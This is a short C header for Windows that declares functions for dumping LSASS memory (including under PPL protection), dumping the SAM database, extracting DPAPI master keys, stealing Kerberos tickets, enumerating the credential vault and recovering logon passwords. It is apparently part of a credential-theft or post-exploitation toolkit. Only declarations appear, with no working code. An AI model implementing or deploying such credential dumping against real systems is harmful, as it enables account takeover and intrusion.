#ifndef CREDENTIALS_H
#define CREDENTIALS_H

#include <windows.h>
#include <stddef.h>

int cred_lsass_dump(void **out_data, size_t *out_len);
int cred_lsass_ppl_dump(void **out_data, size_t *out_len);

int cred_sam_dump(void **out_data, size_t *out_len);

int cred_dpapi_masterkeys(void **out_data, size_t *out_len);
int cred_dpapi_decrypt(const void *blob, size_t blob_len, void **out_data, size_t *out_len);

int cred_kerberos_tickets(void **out_data, size_t *out_len);

int cred_vault_enumerate(void **out_data, size_t *out_len);

int cred_logon_passwords(void **out_data, size_t *out_len);

#endif
